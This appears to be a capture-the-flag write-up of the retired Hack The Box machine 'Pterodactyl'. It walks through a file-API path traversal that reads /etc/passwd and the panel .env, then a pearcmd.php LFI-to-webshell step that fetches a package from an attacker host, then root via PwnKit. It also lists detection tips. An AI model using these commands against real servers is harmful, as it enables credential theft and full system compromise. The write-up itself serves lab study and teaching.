---
machine: Pterodactyl
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, opensuse, pterodactyl, path-traversal, pear, lfi, polkit]
---

# Pterodactyl — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (ref.), publishable.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

An openSUSE host running the **Pterodactyl** game-server management panel. A **path traversal** in the file API (CVE-2025-49132) reads the panel `.env` and reaches an **LFI**; with `register_argc_argv` enabled, `pearcmd.php` turns that LFI into webshell writing. Root comes from the openSUSE **PAM/Polkit** stack.

## Recon

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp   ssh    OpenSSH
80/tcp   http   redirect to 443
443/tcp  https  Pterodactyl panel
```

```bash
curl -sk https://<IP>/api/application/v2 | jq
```

The panel version shows in `/api/application` or the login HTML (`Pterodactyl v1.x`). Compare the changelog against CVE-2025-49132.

## Path traversal in the file API

The file-content endpoint does not normalise the path:

```bash
curl -sk "https://<IP>/api/client/servers/<id>/files/contents?file=../../../../../../etc/passwd"
```

With a client session you can read panel files; the target is `.env`:

```bash
curl -sk "https://<IP>/api/client/servers/<id>/files/contents?file=../../../../../../var/www/pterodactyl/.env"
```

The `.env` yields `APP_KEY`, MySQL credentials and mail settings. Those credentials open the panel database and the admin hashes, and may be reused over SSH.

## LFI to RCE with PEAR

When `register_argc_argv = On`, PHP fills `$argv` from the query string. `pearcmd.php` treats those as console arguments, so an LFI into it allows `install`:

```bash
# package with the webshell, served locally
python3 -m http.server 80

curl -sk "https://<IP>/index.php?+install+-R+/srv/www/htdocs+http://<ATTACKER_IP>/pkg.tgz&file=/usr/share/pear/pearcmd.php"
```

PEAR unpacks the archive into the web root and the webshell becomes reachable. The equivalent `+config-create+` variant writes an attacker-controlled file. Either way you get execution as `wwwrun`/`nginx`.

## Privilege escalation to root

```bash
id; cat /etc/os-release          # openSUSE
ls -la /etc/pam.d/
cat /etc/pam.d/common-auth-pc
pkexec --version
```

The openSUSE PAM stack and the Polkit version are the target: an unpatched `pkexec` falls to PwnKit (CVE-2021-4034), and a misconfigured Polkit rule (`auth_admin_keep` over a writable binary) runs commands as root without a password.

```bash
# PwnKit
gcc -o pwnkit cve-2021-4034.c
./pwnkit
```

As root, read `/root/root.txt` and the user flag from the matching home directory.

## Lessons

- An outdated third-party panel is entry surface: the traversal needs only a client session, not admin.
- `register_argc_argv` in production turns any LFI into command execution through PEAR.
- A panel `.env` holds application keys and database credentials: it is the first file to read.
- Detection: requests with `../` against `/files/contents`, access to `pearcmd.php`, and `pkexec` spawned by a web user.
